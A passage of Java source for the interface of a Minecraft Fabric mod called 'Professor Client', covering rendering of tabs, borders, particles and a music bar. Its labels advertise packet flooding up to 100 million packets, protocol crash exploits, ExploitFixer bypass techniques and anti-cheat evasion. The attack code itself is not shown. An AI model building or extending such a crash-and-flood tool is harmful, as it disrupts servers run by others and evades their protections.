            ctx.drawText(textRenderer,ef,cx-textRenderer.getWidth(ef)/2,bpy+48,(int)(180+75*glow)<<24|GREEN,false);
        }
    }

    // ─── Tab glow indicators ──────────────────────────────────────────────

    private void drawTabGlows(DrawContext ctx,int bpx,int bpy){
        int tw=(PW-16)/NT;
        for(int i=0;i<NT;i++){
            float g=tabGlow[i]; if(g<0.01f)continue;
            int bx=bpx+8+i*(tw+1),a=(int)(g*200),c=TCOLS[i];
            ctx.fill(bx,bpy+60,bx+tw,bpy+62,(a<<24)|c);
            ctx.fill(bx+2,bpy+62,bx+tw-2,bpy+63,(a/4<<24)|c);
            if(i==tab){ctx.fill(bx,bpy+44,bx+tw,bpy+62,(int)(g*18)<<24|c);}
        }
    }

    // ─── Tab hint text ────────────────────────────────────────────────────

    private void drawTabHint(DrawContext ctx,int cx,int bpy,int bpx){
        switch(tab){
            case 0 -> drawInfoContent(ctx,cx,bpy,bpx);
            case 1 -> {
                ctx.drawText(textRenderer,"Packet Count  (max 100,000,000):",
                    cx-textRenderer.getWidth("Packet Count  (max 100,000,000):")/2,bpy+82,0x9900F5FF,false);
                ctx.drawText(textRenderer,"Presets:",cx-115,bpy+102,0x7700AADD,false);
                // bypass desc
                ctx.drawText(textRenderer,BYP_DESC[bypassMode],
                    cx-textRenderer.getWidth(BYP_DESC[bypassMode])/2,bpy+196,
                    (int)(60+30*glow)<<24|MUTED,false);
                if(unlimitedMode&&tick%16<10){
                    String ul="!!! UNLIMITED — 100,000,000 PACKETS !!!";
                    ctx.drawText(textRenderer,ul,cx-textRenderer.getWidth(ul)/2,bpy+48,(int)(210+45*glow)<<24|RED,false);
                }
            }
            case 2 -> {
                String h=">> PROTOCOL EXPLOITS  (PacketCrashBypass"+(efBypass?" ACTIVE":"")+" ) <<";
                ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+55,(int)(185+65*glow)<<24|RED,false);
            }
            case 3 -> {
                String h=">> ExploitFixer BYPASS  --  all methods stay below EF thresholds <<";
                ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+55,(int)(185+65*glow)<<24|GREEN,false);
            }
        }
    }

    // ─── INFO tab content ─────────────────────────────────────────────────

    private void drawInfoContent(DrawContext ctx,int cx,int bpy,int bpx){
        int lx=bpx+30,lw=PW-60,ly=bpy+72;
        int ca=(int)(180+60*glow);

        // Feature list
        String[][] info={
            {" Professor Client v2.0","  --  Elite Fabric Mod for Minecraft 1.21.1"},
            {" PACKETS tab","  --  Up to 100,000,000 packets  |  12 bypass modes"},
            {" CRASHER tab","  --  7 Protocol exploits + MEGA combo"},
            {" SAFE tab","  --  7 ExploitFixer bypass techniques"},
            {" ExploitFixer Bypass","  --  Integrated in ALL modules when active"},
            {" Bypass: GRIM, NCP, Matrix, AAC, Watchdog, Intave, Verus, Polar",""},
            {" Music","  --  Silhouette  (full loop, custom OGG)"},
        };
        int[] cols={CYAN,PURPLE,RED,GREEN,GREEN,GOLD,PURPLE};

        for(int i=0;i<info.length;i++){
            int yl=ly+i*22;
            ctx.drawText(textRenderer,info[i][0],lx,yl,(ca<<24)|cols[i],false);
            if(!info[i][1].isEmpty())
                ctx.drawText(textRenderer,info[i][1],lx+textRenderer.getWidth(info[i][0]),yl,(int)(ca*0.6f)<<24|0xAAAAAA,false);
        }

        // Session stats
        int sy=ly+info.length*22+10;
        ctx.fill(lx,sy,lx+lw,sy+1,(int)(0x33*(0.5f+0.5f*glow))<<24|GOLD);
        ctx.drawText(textRenderer,"Session Packets Sent: "+fmtLong(totalSent),lx,sy+6,(ca<<24)|GOLD,false);

        boolean connected=client!=null&&client.player!=null;
        String connStr=connected?"CONNECTED  --  "+client.getCurrentServerEntry().address:"NOT CONNECTED";
        ctx.drawText(textRenderer,connStr,lx,sy+20,(ca<<24)|(connected?GREEN:RED),false);
    }

    // ─── Border ───────────────────────────────────────────────────────────

    private void drawBorder(DrawContext ctx,int bpx,int bpy){
        float h=hue;
        int bR=tab==2?200:(int)(Math.abs(Math.sin(h*6.28f))*155);
        int bG=Math.max(0,Math.min(255,(int)(180+75*Math.sin(h*6.28f+2.1))));
        int bB=Math.max(0,Math.min(255,(int)(240+15*Math.sin(h*6.28f+4.2))));
        int bA=(int)((0.65f+0.35f*glow)*255);
        int bc=(bA<<24)|(bR<<16)|(bG<<8)|bB;
        int bc2=((bA/4)<<24)|(bR<<16)|(bG<<8)|bB;
        ctx.fill(bpx,    bpy,    bpx+PW,bpy+2,   bc);
        ctx.fill(bpx,    bpy+PH-2,bpx+PW,bpy+PH,bc);
        ctx.fill(bpx,    bpy,    bpx+2,  bpy+PH, bc);
        ctx.fill(bpx+PW-2,bpy,  bpx+PW, bpy+PH, bc);
        ctx.fill(bpx+2,  bpy+2, bpx+PW-2,bpy+3, bc2);
        ctx.fill(bpx+2,  bpy+PH-3,bpx+PW-2,bpy+PH-2,bc2);
        // Gold corners
        int gcA=(int)(0xEE*(0.7f+0.3f*glow));
        int gc=(gcA<<24)|GOLD; int cs=20;
        ctx.fill(bpx,bpy,bpx+cs,bpy+3,gc);ctx.fill(bpx,bpy,bpx+3,bpy+cs,gc);
        ctx.fill(bpx+PW-cs,bpy,bpx+PW,bpy+3,gc);ctx.fill(bpx+PW-3,bpy,bpx+PW,bpy+cs,gc);
        ctx.fill(bpx,bpy+PH-3,bpx+cs,bpy+PH,gc);ctx.fill(bpx,bpy+PH-cs,bpx+3,bpy+PH,gc);
        ctx.fill(bpx+PW-cs,bpy+PH-3,bpx+PW,bpy+PH,gc);ctx.fill(bpx+PW-3,bpy+PH-cs,bpx+PW,bpy+PH,gc);
    }

    // ─── BG layers ────────────────────────────────────────────────────────

    private void drawGrid(DrawContext ctx,int W,int H){
        int c=0x05000000|CYAN;
        for(int x=0;x<W;x+=50)ctx.fill(x,0,x+1,H,c);
        for(int y=0;y<H;y+=50)ctx.fill(0,y,W,y+1,c);
    }
    private void drawOrbsLayer(DrawContext ctx){
        for(int i=0;i<OC;i++){
            float tw=(MathHelper.sin(oph[i])+1f)/2f;
            int a=(int)(28*tw*(0.4f+0.3f*glow));if(a<=0)continue;
            int sz=(int)osz[i];
            int c=switch(oct[i]){case 1->PURPLE;case 2->GOLD;default->CYAN;};
            ctx.fill((int)ox[i]-sz,(int)oy[i]-sz/2,(int)ox[i]+sz,(int)oy[i]+sz/2,(a<<24)|c);
        }
    }
    private void drawStreams(DrawContext ctx){
        for(int i=0;i<SC;i++){
            sy[i]+=ss[i];
            if(sy[i]>height+20){sy[i]=-20;sc[i]=rng.nextInt(DS.length());}
            if(rng.nextInt(25)==0)sc[i]=rng.nextInt(DS.length());
            if(sy[i]<0)continue;
            int hA=(int)(40+30*glow);
            ctx.drawText(textRenderer,String.valueOf(DS.charAt(sc[i])),(int)sx[i]-4,(int)sy[i],(Math.min(255,hA*2)<<24)|CYAN,false);
            if(sy[i]>14)ctx.drawText(textRenderer,String.valueOf(DS.charAt(sc[i])),(int)sx[i]-4,(int)sy[i]-14,(hA<<24)|MUTED,false);
        }
    }
    private void drawParticles(DrawContext ctx,int W,int H){
        for(int i=0;i<PC;i++){
            px2[i]+=pvx[i];py2[i]+=pvy[i];pph[i]+=psp[i];
            if(py2[i]<-10){py2[i]=H+5;px2[i]=rng.nextFloat()*W;}
            if(px2[i]<0)px2[i]=W;if(px2[i]>W)px2[i]=0;
            float tw=(MathHelper.sin(pph[i])+1f)/2f;
            int a=(int)(0.85f*tw*220);if(a<8)continue;
            boolean big=psz[i]>2f;
            int col=switch(pct[i]){
                case 1->(a<<24)|(big?PURPLE:0x220033);
                case 2->(a<<24)|(big?GOLD  :0x443300);
                case 3->(a<<24)|(big?RED   :0x330000);
                case 4->(a<<24)|(big?GREEN :0x003311);
                default->(a<<24)|(big?CYAN :0x003344);
            };
            int sz=psz[i]>2.5f?2:1;
            ctx.fill((int)px2[i],(int)py2[i],(int)px2[i]+sz,(int)py2[i]+sz,col);
        }
    }
    private void drawCenterGlow(DrawContext ctx,int cx,int cy){
        int[] r={340,250,165,95},a={4,8,14,22};int gc=TCOLS[tab];
        for(int i=0;i<4;i++){int aa=(int)(a[i]*(0.5f+0.5f*glow));ctx.fill(cx-r[i],cy-r[i]/2,cx+r[i],cy+r[i]/2,(aa<<24)|gc);}
    }
    private void updateTrail(int mx,int my){trail.addFirst(new int[]{mx,my,0});if(trail.size()>24)trail.removeLast();for(int[]p:trail)p[2]++;}
    private void drawTrail(DrawContext ctx){for(int[]p:trail){int age=p[2];if(age==0)continue;int a=Math.max(0,220-age*10);if(a<=0)continue;int r=3+age/3;int col=age<8?(a<<24)|TCOLS[tab]:(a<<24)|PURPLE;ctx.fill(p[0]-r,p[1]-1,p[0]+r,p[1]+1,col);ctx.fill(p[0]-1,p[1]-r,p[0]+1,p[1]+r,col);}}
    private void drawCursorGlow(DrawContext ctx,int mx,int my){int tc=TCOLS[tab];int[]rad={28,16,7},alp={9,24,60};for(int i=0;i<3;i++){int r=rad[i];int a=(int)(alp[i]*(0.65f+0.35f*glow));ctx.fill(mx-r,my-1,mx+r,my+1,(a<<24)|tc);ctx.fill(mx-1,my-r,mx+1,my+r,(a<<24)|tc);}ctx.fill(mx-2,my-2,mx+2,my+2,0xCC000000|tc);}

    // ─── Status + Music bar ───────────────────────────────────────────────

    private void drawStatus(DrawContext ctx,int cx,int bpx,int bpy){
        if(statusTimer<=0||statusText.isEmpty())return;
        int a=Math.min(255,statusTimer*2),col=(statusColor&0x00FFFFFF)|(a<<24);
        ctx.fill(bpx+6,bpy+PH-26,bpx+PW-6,bpy+PH-6,0x99000000);
        ctx.fill(bpx+6,bpy+PH-26,bpx+9,bpy+PH-6,(a<<24)|GOLD);
        ctx.fill(bpx+PW-9,bpy+PH-26,bpx+PW-6,bpy+PH-6,(a<<24)|GOLD);
        ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-19,col,false);
    }

    private void drawMusicBar(DrawContext ctx,int bpx,int bpy){
        boolean playing=ProfessorMusicManager.isPlaying(client);
        float prog=ProfessorMusicManager.getProgress();
        int barX=bpx+12,barY=bpy+PH-42,barW=PW-90,barH=4;
        ctx.fill(barX,barY,barX+barW,barY+barH,0x220000FF);
        int fw=(int)(barW*prog);
        if(fw>0){
            for(int xi=0;xi<fw;xi++){float f=(float)xi/barW;int r=(int)(f*155),g=Math.max(0,(int)(245-245*f));ctx.fill(barX+xi,barY,barX+xi+1,barY+barH,0xFF000000|(r<<16)|(g<<8)|255);}
            ctx.fill(barX+fw-4,barY-2,barX+fw+2,barY+barH+2,(int)(80*glow)<<24|CYAN);
        }
        // EQ bars
        for(int i=0;i<20;i++){float h=(float)((Math.sin(tick*0.14+i*0.6)+1)/2)*barH*2+1;int ba=(int)(45+35*glow);int bc2=i<7?(ba<<24)|PURPLE:i<14?(ba<<24)|CYAN:(ba<<24)|GOLD;ctx.fill(barX+barW+5+i*3,barY-1,barX+barW+7+i*3,(int)(barY+barH+h),bc2);}
        String lbl=(playing?"+ PLAYING":"+ PAUSED")+"  Silhouette";
        ctx.drawText(textRenderer,lbl,barX,barY-9,(int)(75+45*glow)<<24|(playing?CYAN:MUTED),false);
    }

    // ─── Utility ──────────────────────────────────────────────────────────

    private String fmtLong(long v){if(v>=1_000_000)return (v/1_000_000)+"M+";if(v>=1_000)return (v/1_000)+"K+";return ""+v;}

    @Override public boolean keyPressed(int kc,int sc2,int m){if(pktField!=null&&pktField.isFocused()&&pktField.keyPressed(kc,sc2,m))return true;return super.keyPressed(kc,sc2,m);}
    @Override public boolean charTyped(char c,int m){if(pktField!=null&&pktField.isFocused())return pktField.charTyped(c,m);return super.charTyped(c,m);}
    @Override public boolean mouseClicked(double mx,double my,int b){if(pktField!=null)pktField.mouseClicked(mx,my,b);return super.mouseClicked(mx,my,b);}
}
